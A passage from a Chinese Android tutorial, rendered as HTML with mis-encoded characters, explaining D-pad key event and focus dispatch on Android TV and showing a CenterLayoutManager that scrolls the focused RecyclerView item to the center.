    <span class="hljs-keyword">if</span> (mInputEventConsistencyVerifier != <span class="hljs-literal">null</span>) {
        mInputEventConsistencyVerifier.onKeyEvent(event, <span class="hljs-number">1</span>);
    }

    <span class="hljs-keyword">if</span> ((mPrivateFlags &amp; (PFLAG_FOCUSED | PFLAG_HAS_BOUNDS))
            == (PFLAG_FOCUSED | PFLAG_HAS_BOUNDS)) {
        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">super</span>.dispatchKeyEvent(event)) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        }
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mFocused != <span class="hljs-literal">null</span> &amp;&amp; (mFocused.mPrivateFlags &amp; PFLAG_HAS_BOUNDS)
            == PFLAG_HAS_BOUNDS) {
        <span class="hljs-keyword">if</span> (mFocused.dispatchKeyEvent(event)) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        }
    }

    <span class="hljs-keyword">if</span> (mInputEventConsistencyVerifier != <span class="hljs-literal">null</span>) {
        mInputEventConsistencyVerifier.onUnhandledEvent(event, <span class="hljs-number">1</span>);
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
}
</code></pre>
<p>æœ¬ç¯‡æˆ‘ä»¬é‡ç‚¹æ˜¯æ–¹å‘æŒ‰é”®çš„å¤„ç†ã€‚</p>
<h4 data-id="heading-5">ViewRootImpl KeyEventäº‹ä»¶</h4>
<p>ä¸è§¦æ‘¸äº‹ä»¶ä¸åŒçš„æ˜¯ï¼ŒKeyEventçš„æ–¹å‘æŒ‰é”®å¯èƒ½éœ€è¦ä¸¤æ¬¡å—åˆ°ViewRootImplçš„æ§åˆ¶ï¼Œç¬¬äºŒæ¬¡ä¾èµ–ç¬¬ä¸€æ¬¡çš„å¤„ç†é€»è¾‘ï¼Œå¦‚æœç¬¬ä¸€æ¬¡æ²¡æœ‰å¤„ç†ï¼Œåˆ™ç”±ViewRootImplå‘èµ·ç„¦ç‚¹æŸ¥è¯¢ã€‚</p>
<p>ç¬¬ä¸€æ¬¡ï¼Œå’Œæ™®é€šçš„äº‹ä»¶ä¸€æ ·ï¼Œé¡ºç€ç„¦ç‚¹é“¾å‘å¸¦ç„¦ç‚¹çš„ä¼ é€’
ç¬¬äºŒæ¬¡ï¼Œå¦‚æœç¬¬ä¸€æ¬¡æ²¡æœ‰æ–¹å‘é”®å¤„ç†ACTION_DOWNäº‹ä»¶åˆ™å‘èµ·ç„¦ç‚¹æœç´¢ï¼ˆæ–¹å‘é”®ä»¥å¤–çš„å…¶ä»–äº‹ä»¶ä¸¢å¼ƒæˆ–è€…ç»§ç»­å…³æ³¨ACTION_UPçš„å›è°ƒï¼‰</p>
<p>è¿™éƒ¨åˆ†çš„å…·ä½“é€»è¾‘å‚è€ƒViewRootImplç›¸å…³é€»è¾‘</p>
<pre><code class="hljs language-java" lang="java">android.view.ViewRootImpl.ViewPostImeInputStage#processKeyEvent
</code></pre>
<p>ä¸‹é¢æˆ‘ä»¬æˆ‘ä»¬äº†è§£ä¸‹ç„¦ç‚¹çš„åˆ†å‘</p>
<h3 data-id="heading-6">ç„¦ç‚¹åˆ†å‘</h3>
<p>å®é™…ä¸Šï¼Œä¸å…¶è¯´æ˜¯ç„¦ç‚¹çš„åˆ†å‘ï¼Œä¸å¦‚è¯´æ˜¯æ–¹å‘æŒ‰é”®çš„åˆ†å‘ï¼Œè°ƒåº¦é€»è¾‘å‚è€ƒ ViewRootImplæºç </p>
<p>åœ¨è¿™éƒ¨åˆ†æºç ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æ³¨æ„åˆ°å¾ˆå¤šç„¦ç‚¹äº‹ä»¶çš„è½¬åŒ–ï¼Œå¦å¤–ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå¦‚æœæ²¡æœ‰DecorViewèšç„¦æ—¶ï¼ŒDecorViewé»˜è®¤ä¼šè°ƒç”¨restoreDefaultFocusç»™è‡ªèº«ç„¦ç‚¹ã€‚</p>
<pre><code class="hljs language-java" lang="java">
<span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">performFocusNavigation</span><span class="hljs-params">(KeyEvent event)</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">direction</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    <span class="hljs-keyword">switch</span> (event.getKeyCode()) {
        <span class="hljs-keyword">case</span> KeyEvent.KEYCODE_DPAD_LEFT:
            <span class="hljs-keyword">if</span> (event.hasNoModifiers()) {
                direction = View.FOCUS_LEFT;
            }
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">case</span> KeyEvent.KEYCODE_DPAD_RIGHT:
            <span class="hljs-keyword">if</span> (event.hasNoModifiers()) {
                direction = View.FOCUS_RIGHT;
            }
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">case</span> KeyEvent.KEYCODE_DPAD_UP:
            <span class="hljs-keyword">if</span> (event.hasNoModifiers()) {
                direction = View.FOCUS_UP;
            }
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">case</span> KeyEvent.KEYCODE_DPAD_DOWN:
            <span class="hljs-keyword">if</span> (event.hasNoModifiers()) {
                direction = View.FOCUS_DOWN;
            }
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">case</span> KeyEvent.KEYCODE_TAB:
            <span class="hljs-keyword">if</span> (event.hasNoModifiers()) {
                direction = View.FOCUS_FORWARD;
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (event.hasModifiers(KeyEvent.META_SHIFT_ON)) {
                direction = View.FOCUS_BACKWARD;
            }
            <span class="hljs-keyword">break</span>;
    }
    <span class="hljs-keyword">if</span> (direction != <span class="hljs-number">0</span>) {
        <span class="hljs-type">View</span> <span class="hljs-variable">focused</span> <span class="hljs-operator">=</span> mView.findFocus();
        <span class="hljs-keyword">if</span> (focused != <span class="hljs-literal">null</span>) {
            <span class="hljs-type">View</span> <span class="hljs-variable">v</span> <span class="hljs-operator">=</span> focused.focusSearch(direction);
            <span class="hljs-keyword">if</span> (v != <span class="hljs-literal">null</span> &amp;&amp; v != focused) {
                <span class="hljs-comment">// do the math the get the interesting rect</span>
                <span class="hljs-comment">// of previous focused into the coord system of</span>
                <span class="hljs-comment">// newly focused view</span>
                focused.getFocusedRect(mTempRect);
                <span class="hljs-keyword">if</span> (mView <span class="hljs-keyword">instanceof</span> ViewGroup) {
                    ((ViewGroup) mView).offsetDescendantRectToMyCoords(
                            focused, mTempRect);
                    ((ViewGroup) mView).offsetRectIntoDescendantCoords(
                            v, mTempRect);
                }
                <span class="hljs-keyword">if</span> (v.requestFocus(direction, mTempRect)) {
                    playSoundEffect(SoundEffectConstants
                            .getContantForFocusDirection(direction));
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
                }
            }

            <span class="hljs-comment">// Give the focused view a last chance to handle the dpad key.</span>
            <span class="hljs-keyword">if</span> (mView.dispatchUnhandledMove(focused, direction)) {
                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
            }
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">if</span> (mView.restoreDefaultFocus()) {
                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
            }
        }
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
}
</code></pre>
<p>è¿™é‡Œæˆ‘ä»¬è¦æ¸…æ¥šçš„ç‚¹æ˜¯ï¼Œä»»ä½•äº‹ä»¶ï¼ŒdispatchKeyEventæ˜¯å¿…é¡»è¦è°ƒç”¨çš„ï¼Œè€Œä¸”åœ¨Viewè·ç„¦ä¹‹å‰ä¼šè°ƒç”¨ï¼Œä¼¼ä¹è¿™é‡Œå¯ä»¥æ‹¦æˆªç„¦ç‚¹ï¼Œå…¶å®è¿™æ ·æƒ³ä¹Ÿæ²¡æœ‰é—®é¢˜ã€‚</p>
<p>ä½†æ˜¯ï¼Œæˆ‘è¿™é‡Œè¦è¯´çš„æ˜¯ï¼ŒfocusSearchå…¶å®è¦æ¯”dispatchKeyEventå¥½çš„å¤š</p>
<p>æˆ‘ä»¬çŸ¥é“ï¼ŒdispatchKeyEventæœªå¤„ç†çš„æ–¹å‘äº‹ä»¶æ‰ä¼šç»™focusSearchï¼Œä½†æ˜¯ï¼Œå¾ˆå¤šäº‹ä»¶çš„å¤„ç†ä¸­ï¼Œå‡è®¾æˆ‘ä»¬æ‹¦æˆªdispatchKeyEventï¼Œå¯èƒ½é€ æˆå¾ˆå¤šæ„æƒ³ä¸åˆ°çš„é—®é¢˜ï¼Œå¦å¤–ï¼Œå¦‚æœç„¦ç‚¹é“¾å±‚çº§å¤ªæ·±ï¼Œä¸€äº›é¡¶éƒ¨Viewçš„dispatchKeyEventå¹¶ä¸èƒ½æ˜ç¡®çŸ¥é“å…·ä½“ç”±å“ªä¸ªViewå‘å…¶ä»–Viewè½¬æ¢ï¼Œä»¥åŠç„¦ç‚¹çˆ¶Viewçš„é€»è¾‘ï¼Œè´¸ç„¶å¤„ç†ï¼Œåè€Œå¢åŠ äº†å¤æ‚æ€§ï¼Œç›¸æ¯”è€Œè¨€focusSearchè·Ÿæ¥è¿‘å­Viewæœ¬èº«ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> View <span class="hljs-title function_">focusSearch</span><span class="hljs-params">(View focused, <span class="hljs-type">int</span> direction)</span> {
    <span class="hljs-keyword">if</span> (isRootNamespace()) {
        <span class="hljs-comment">// root namespace means we should consider ourselves the top of the</span>
        <span class="hljs-comment">// tree for focus searching; otherwise we could be focus searching</span>
        <span class="hljs-comment">// into other tabs.  see LocalActivityManager and TabHost for more info.</span>
        <span class="hljs-keyword">return</span> FocusFinder.getInstance().findNextFocus(<span class="hljs-built_in">this</span>, focused, direction);
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mParent != <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">return</span> mParent.focusSearch(focused, direction);
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
}
</code></pre>
<p>å› æ­¤ï¼Œæˆ‘ä»¬åœ¨focusSearchè¿™é‡Œæ‹¦æˆªå’Œåˆ†å‘ç„¦ç‚¹åº”è¯¥ä½œä¸ºé¦–é€‰ã€‚</p>
<p>ä¸‹é¢æ˜¯ä¸€ç›´ä¸ªè½¬ç§»æ–¹å¼</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> View <span class="hljs-title function_">focusSearch</span><span class="hljs-params">(<span class="hljs-type">int</span> direction)</span> {
    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">this</span>.focusSearchListener != <span class="hljs-literal">null</span>){
        <span class="hljs-type">View</span> <span class="hljs-variable">current</span> <span class="hljs-operator">=</span> findFocus();
        <span class="hljs-type">View</span> <span class="hljs-variable">view</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.focusSearchListener.onFocusSearch(current, direction);
        <span class="hljs-keyword">if</span>(view != <span class="hljs-literal">null</span>){
            <span class="hljs-keyword">return</span> view;
        }
    }
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.focusSearch(direction);
}
</code></pre>
<h3 data-id="heading-7">RecyclerViewç„¦ç‚¹</h3>
<p>ReyclerViewæ˜¯éš¾åº¦æ›´é«˜çš„ç„¦ç‚¹å¤„ç†ç»„ä»¶ä¹‹ä¸€ï¼Œåœ¨ä¹‹å‰çš„æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬è¯´è¿‡ï¼ŒTVæ¨¡å¼åº”è¯¥æœ‰é™ä½¿ç”¨çŸ­åˆ—è¡¨ï¼Œé¿å…é•¿åˆ—è¡¨ï¼Œä½†å®é™…æ“ä½œä¸­ï¼Œä¸€äº›æ¡ç›®ä¹Ÿæ˜¯éå¸¸å¤šï¼Œéœ€è¦æŒ‰ç€é¥æ§å™¨ä¸æ–­è°ƒæ•´æ–¹å‘å’Œä½ç½®ï¼Œå¢åŠ äº†ç”¨æˆ·çš„å·¥ä½œé‡ã€‚</p>
<p>å½“ç„¶ï¼Œè¿™é‡Œæˆ‘ä»¬å®é™…å¼€å‘ä¸­ï¼Œä¸»è¦éœ€è¦å¤„ç†RecyclerView Itemä¸¢ç„¦é—®é¢˜</p>
<p>é¦–å…ˆï¼Œæˆ‘å¯èƒ½è‚¯å®šè¦é˜²æŠ–ï¼Œå°±æ˜¯é¿å…äº‹ä»¶æ–¹å‘äº‹ä»¶è§¦å‘è¿‡å¿«ã€‚
é™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘ä»¬éœ€è¦ç„¦ç‚¹Viewä»¥åŠç›¸é‚»çš„Viewå°½å¯èƒ½æ¼å‡ºï¼Œå½“ç„¶ï¼Œæœ€ç»ˆéœ€è¦å®šä¹‰LayoutManager</p>
<p>ä¸‹é¢æˆ‘ä»¬æ€»ç»“äº†ä¸¤ç§ä¸¤ç§å¸¸è§çš„åœºæ™¯</p>
<h4 data-id="heading-8">èšç„¦ItemViewå±…ä¸­</h4>
<p>è¿™éƒ¨åˆ†ç›¸å¯¹ç®€å•ï¼Œä¸»è¦æ˜¯å°†èšç„¦çš„Viewç§»åŠ¨åˆ°RecyclerViewä¸­é—´ä½ç½®ï¼Œå…·ä½“ä»£ç å¦‚ä¸‹</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CenterLayoutManager</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">LinearLayoutManager</span> {

    <span class="hljs-comment">// ç›‘å¬å™¨æ¥å£ï¼Œç”¨äºåœ¨ Item å±…ä¸­æ—¶è¿›è¡Œé¢å¤–æ“ä½œ (å¯é€‰)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">OnCenterItemFocusListener</span> {
        <span class="hljs-keyword">void</span> <span class="hljs-title function_">onFocus</span><span class="hljs-params">(<span class="hljs-type">int</span> position)</span>;
    }

    <span class="hljs-keyword">private</span> RecyclerView recyclerView;
    <span class="hljs-keyword">private</span> OnCenterItemFocusListener onCenterItemFocusListener;

    <span class="hljs-comment">// é˜²æ­¢é€’å½’è°ƒç”¨çš„ä¿æŠ¤æ ‡å¿—</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">isScrollingToCenter</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TAG</span> <span class="hljs-operator">=</span> <span class="hljs-string">"CenterLayoutManager"</span>;

    <span class="hljs-comment">// ã€å…³é”®ä¿®æ”¹ 1ã€‘å°†ç›‘å¬å™¨ä½œä¸ºæˆå‘˜å˜é‡ï¼Œä»¥ä¾¿åœ¨ç”Ÿå‘½å‘¨æœŸæ–¹æ³•ä¸­å¼•ç”¨å’Œç§»é™¤</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> RecyclerView.OnScrollListener scrollStateListener;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">CenterLayoutManager</span><span class="hljs-params">(Context context, <span class="hljs-type">int</span> orientation, <span class="hljs-type">boolean</span> reverseLayout)</span> {
        <span class="hljs-built_in">super</span>(context, orientation, reverseLayout);

        <span class="hljs-comment">// åˆå§‹åŒ–æ»šåŠ¨çŠ¶æ€ç›‘å¬å™¨</span>
        scrollStateListener = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RecyclerView</span>.OnScrollListener() {
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onScrollStateChanged</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> RecyclerView recyclerView, <span class="hljs-type">int</span> newState)</span> {
                <span class="hljs-built_in">super</span>.onScrollStateChanged(recyclerView, newState);

                <span class="hljs-comment">// ä»…åœ¨æ»šåŠ¨é™æ­¢æ—¶ (IDLE) æ£€æŸ¥æ˜¯å¦éœ€è¦é‡ç½®æ ‡å¿—</span>
                <span class="hljs-keyword">if</span> (newState == RecyclerView.SCROLL_STATE_IDLE) {
                    <span class="hljs-keyword">if</span> (isScrollingToCenter) {
                        Logger.d(TAG, <span class="hljs-string">"Scroll finished. Resetting isScrollingToCenter to false."</span>);
                        isScrollingToCenter = <span class="hljs-literal">false</span>;
                    }
                }
            }
        };
    }

    <span class="hljs-comment">// æ•æ‰å¯¹ RecyclerView çš„å¼•ç”¨ï¼Œå¹¶æ³¨å†Œæ»šåŠ¨ç›‘å¬å™¨æ¥ç®¡ç†çŠ¶æ€</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onAttachedToWindow</span><span class="hljs-params">(RecyclerView view)</span> {
        <span class="hljs-built_in">super</span>.onAttachedToWindow(view);
        <span class="hljs-built_in">this</span>.recyclerView = view;

        <span class="hljs-comment">// æ³¨å†Œæ»šåŠ¨ç›‘å¬å™¨</span>
        view.addOnScrollListener(scrollStateListener);
    }

    <span class="hljs-comment">// ã€å…³é”®ä¿®æ”¹ 2ã€‘åœ¨ä»çª—å£åˆ†ç¦»æ—¶ç§»é™¤ç›‘å¬å™¨å¹¶æ¸…é™¤å¼•ç”¨ï¼Œé˜²æ­¢å†…å­˜æ³„æ¼</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onDetachedFromWindow</span><span class="hljs-params">(RecyclerView recyclerView, RecyclerView.Recycler recycler)</span> {
        <span class="hljs-built_in">super</span>.onDetachedFromWindow(recyclerView, recycler);

        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.recyclerView != <span class="hljs-literal">null</span>) {
            <span class="hljs-comment">// ç§»é™¤ç›‘å¬å™¨ä»¥é˜²æ­¢å†…å­˜æ³„æ¼</span>
            <span class="hljs-built_in">this</span>.recyclerView.removeOnScrollListener(scrollStateListener);
            <span class="hljs-comment">// æ¸…é™¤å¯¹ RecyclerView çš„å¼•ç”¨</span>
            <span class="hljs-built_in">this</span>.recyclerView = <span class="hljs-literal">null</span>;
        }
    }

    <span class="hljs-comment">// è®¾ç½®å¤–éƒ¨ç›‘å¬å™¨</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setOnCenterItemFocusListener</span><span class="hljs-params">(OnCenterItemFocusListener listener)</span> {
        <span class="hljs-built_in">this</span>.onCenterItemFocusListener = listener;
    }

    <span class="hljs-comment">/**
     * é‡å†™ smoothScrollToPositionï¼Œç”¨äº D-Pad å¯¼èˆªæ—¶çš„ç³»ç»Ÿè‡ªåŠ¨æ»šåŠ¨ã€‚
     */</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">smoothScrollToPosition</span><span class="hljs-params">(RecyclerView recyclerView, <span class="hljs-meta">@NonNull</span> RecyclerView.State state, <span class="hljs-type">int</span> position)</span> {
        <span class="hljs-type">CenterSmoothScroller</span> <span class="hljs-variable">smoothScroller</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CenterSmoothScroller</span>(recyclerView.getContext());
        smoothScroller.setTargetPosition(position);
        startSmoothScroll(smoothScroller);
    }

    <span class="hljs-comment">/**
     * åœ¨å¸ƒå±€å®Œæˆåï¼Œä¸ºæ‰€æœ‰å¯è§ Item è®¾ç½®åŒ…è£…å™¨ç„¦ç‚¹ç›‘å¬å™¨ã€‚
     */</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onLayoutCompleted</span><span class="hljs-params">(RecyclerView.State state)</span> {
        <span class="hljs-built_in">super</span>.onLayoutCompleted(state);
        <span class="hljs-comment">// ä¸ºæ‰€æœ‰å¯è§ Item è®¾ç½®ç„¦ç‚¹ç›‘å¬å™¨</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; getChildCount(); i++) {
            <span class="hljs-type">View</span> <span class="hljs-variable">child</span> <span class="hljs-operator">=</span> getChildAt(i);
            <span class="hljs-keyword">if</span> (child == <span class="hljs-literal">null</span>) <span class="hljs-keyword">continue</span>;

            View.<span class="hljs-type">OnFocusChangeListener</span> <span class="hljs-variable">existingListener</span> <span class="hljs-operator">=</span> child.getOnFocusChangeListener();

            <span class="hljs-comment">// æ£€æŸ¥ Item ä¸Šå½“å‰çš„ç›‘å¬å™¨æ˜¯å¦å·²ç»æ˜¯æˆ‘ä»¬çš„åŒ…è£…å™¨</span>
            <span class="hljs-keyword">if</span> (!(existingListener <span class="hljs-keyword">instanceof</span> WrappingFocusChangeListener)) {
                <span class="hljs-comment">// å¦‚æœä¸æ˜¯æˆ‘ä»¬çš„åŒ…è£…å™¨ï¼Œåˆ™åˆ›å»ºæ–°çš„åŒ…è£…å™¨å¹¶è®¾ç½®</span>
                <span class="hljs-type">WrappingFocusChangeListener</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WrappingFocusChangeListener</span>(<span class="hljs-built_in">this</span>);
                <span class="hljs-comment">// å­˜å‚¨ Item ä¸Šå¯èƒ½å·²æœ‰çš„ç›‘å¬å™¨ (é€šå¸¸ç”± Adapter è®¾ç½®)ï¼Œä½¿å…¶ä¸å¤±æ•ˆ</span>
                wrapper.setOriginalListener(existingListener);
                child.setOnFocusChangeListener(wrapper);
            }

            <span class="hljs-comment">// é¦–æ¬¡å¸ƒå±€å®Œæˆæ—¶ï¼Œå¦‚æœ Item å·²ç»æœ‰ç„¦ç‚¹ï¼Œä¹Ÿå°†å…¶å¹³æ»‘æ»šåŠ¨åˆ°ä¸­å¿ƒ</span>
            <span class="hljs-keyword">if</span> (child.hasFocus()) {
                centerView(child, <span class="hljs-literal">true</span>);
            }
        }
    }

    <span class="hljs-comment">/**
     * åŒ…è£…å™¨ç„¦ç‚¹ç›‘å¬å™¨ã€‚
     * ä½œç”¨æ˜¯å…ˆæ‰§è¡Œå±…ä¸­é€»è¾‘ï¼Œç„¶åè°ƒç”¨åŸå§‹å¯èƒ½å­˜åœ¨çš„ç›‘å¬å™¨ã€‚
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WrappingFocusChangeListener</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">View</span>.OnFocusChangeListener {
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> CenterLayoutManager layoutManager;
        <span class="hljs-keyword">private</span> View.OnFocusChangeListener originalListener;

        <span class="hljs-keyword">public</span> <span class="hljs-title function_">WrappingFocusChangeListener</span><span class="hljs-params">(CenterLayoutManager lm)</span> {
            <span class="hljs-built_in">this</span>.layoutManager = lm;
        }

        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setOriginalListener</span><span class="hljs-params">(View.OnFocusChangeListener original)</span> {
            <span class="hljs-built_in">this</span>.originalListener = original;
        }

        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onFocusChange</span><span class="hljs-params">(View view, <span class="hljs-type">boolean</span> hasFocus)</span> {
            <span class="hljs-keyword">if</span> (hasFocus) {
                <span class="hljs-comment">// ã€é€’å½’é˜»æ–­ã€‘å¦‚æœæ­£åœ¨æ‰§è¡Œæ»šåŠ¨åˆ°ä¸­å¿ƒçš„æ“ä½œï¼Œåˆ™è·³è¿‡å†æ¬¡è°ƒç”¨ centerView</span>
                <span class="hljs-keyword">if</span> (layoutManager.isScrollingToCenter) {
                    Logger.d(TAG, <span class="hljs-string">"Focus change ignored due to active scrolling."</span>);
                    <span class="hljs-comment">// å…è®¸åŸå§‹ç›‘å¬å™¨ç»§ç»­æ‰§è¡Œï¼Œç„¶åé€€å‡º</span>
                    <span class="hljs-keyword">if</span> (originalListener != <span class="hljs-literal">null</span>) {
                        originalListener.onFocusChange(view, hasFocus);
                    }
                    <span class="hljs-keyword">return</span>;
                }

                <span class="hljs-comment">// 1. æ‰§è¡Œå±…ä¸­é€»è¾‘ (ä½¿ç”¨å¹³æ»‘æ»šåŠ¨)</span>
                layoutManager.centerView(view, <span class="hljs-literal">true</span>);

                <span class="hljs-comment">// 2. é€šçŸ¥ LayoutManager å¤–éƒ¨ç›‘å¬å™¨ (å¦‚æœå­˜åœ¨)</span>
                <span class="hljs-type">int</span> <span class="hljs-variable">position</span> <span class="hljs-operator">=</span> layoutManager.getPosition(view);
                <span class="hljs-keyword">if</span> (position != RecyclerView.NO_POSITION &amp;&amp; layoutManager.onCenterItemFocusListener != <span class="hljs-literal">null</span>) {
                    layoutManager.onCenterItemFocusListener.onFocus(position);
                }
            }

            <span class="hljs-comment">// 3. è°ƒç”¨åŸå§‹ç›‘å¬å™¨ (å¦‚æœå­˜åœ¨ï¼Œæ— è®ºæ˜¯å¦å±…ä¸­ï¼Œéƒ½ä¼šè°ƒç”¨)</span>
            <span class="hljs-keyword">if</span> (originalListener != <span class="hljs-literal">null</span>) {
                originalListener.onFocusChange(view, hasFocus);
            }
        }
    }

    <span class="hljs-comment">/**
     * å°†ç»™å®šçš„ View (Item) æ»šåŠ¨åˆ° RecyclerView çš„ä¸­å¿ƒã€‚
     * <span class="hljs-doctag">@param</span> child è·å¾—ç„¦ç‚¹çš„ Item View
     * <span class="hljs-doctag">@param</span> smooth æ˜¯å¦å¹³æ»‘æ»šåŠ¨
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">centerView</span><span class="hljs-params">(View child, <span class="hljs-type">boolean</span> smooth)</span> {
        <span class="hljs-keyword">if</span> (recyclerView == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span>;

        <span class="hljs-type">int</span> <span class="hljs-variable">delta</span> <span class="hljs-operator">=</span> calculateScrollDelta(child);

        <span class="hljs-comment">// å¦‚æœ delta ä¸º 0ï¼Œè¯´æ˜ View å·²ç»å±…ä¸­ï¼Œæ— éœ€æ»šåŠ¨</span>
        <span class="hljs-keyword">if</span> (delta == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span>;

        <span class="hljs-comment">// åœ¨å‘èµ·æ»šåŠ¨ä¹‹å‰ï¼Œè®¾ç½®ä¿æŠ¤æ ‡å¿—</span>
        isScrollingToCenter = <span class="hljs-literal">true</span>;
        Logger.d(TAG, <span class="hljs-string">"Starting scroll, setting isScrollingToCenter to true. Delta: "</span> + delta);


        <span class="hljs-keyword">if</span> (smooth) {
            <span class="hljs-comment">// å¹³æ»‘æ»šåŠ¨ï¼šä¾èµ– OnScrollListener æ¥é‡ç½® isScrollingToCenter</span>
            <span class="hljs-keyword">if</span> (getOrientation() == HORIZONTAL) {
                recyclerView.smoothScrollBy(delta, <span class="hljs-number">0</span>);
            } <span class="hljs-keyword">else</span> {
                recyclerView.smoothScrollBy(<span class="hljs-number">0</span>, delta);
            }
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// ç«‹å³æ»šåŠ¨ï¼šåŒæ­¥æ“ä½œï¼Œå¯ä»¥ç«‹å³é‡ç½®æ ‡å¿—</span>
            <span class="hljs-keyword">if</span> (getOrientation() == HORIZONTAL) {
                recyclerView.scrollBy(delta, <span class="hljs-number">0</span>);
            } <span class="hljs-keyword">else</span> {
                recyclerView.scrollBy(<span class="hljs-number">0</span>, delta);
            }
            isScrollingToCenter = <span class="hljs-literal">false</span>;
        }
    }

    <span class="hljs-comment">/**
     * è®¡ç®—è¦å°† View æ»šåŠ¨åˆ°ä¸­å¿ƒæ‰€éœ€çš„è·ç¦» (Delta)ã€‚
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-title function_">calculateScrollDelta</span><span class="hljs-params">(View child)</span> {
        <span class="hljs-keyword">if</span> (getOrientation() == HORIZONTAL) {
            <span class="hljs-comment">// æ°´å¹³å±…ä¸­æ»šåŠ¨è·ç¦» = Item å·¦ä¾§ä½ç½® - (RecyclerView å®½åº¦ - Item å®½åº¦) / 2</span>
            <span class="hljs-keyword">return</span> child.getLeft() - (getWidth() - child.getWidth()) / <span class="hljs-number">2</span>;
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// å‚ç›´å±…ä¸­æ»šåŠ¨è·ç¦» = Item é¡¶éƒ¨ä½ç½® - (RecyclerView é«˜åº¦ - Item é«˜åº¦) / 2</span>
            <span class="hljs-keyword">return</span> child.getTop() - (getHeight() - child.getHeight()) / <span class="hljs-number">2</span>;
        }
    }

    <span class="hljs-comment">/**
     * è‡ªå®šä¹‰çš„å¹³æ»‘æ»šåŠ¨å™¨ï¼Œç”¨äºç¡®ä¿æ»šåŠ¨ç›®æ ‡æ˜¯ä¸­å¿ƒä½ç½® (ç”¨äºD-Padå¯¼èˆª)ã€‚
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CenterSmoothScroller</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">LinearSmoothScroller</span> {

        <span class="hljs-keyword">public</span> <span class="hljs-title function_">CenterSmoothScroller</span><span class="hljs-params">(Context context)</span> {
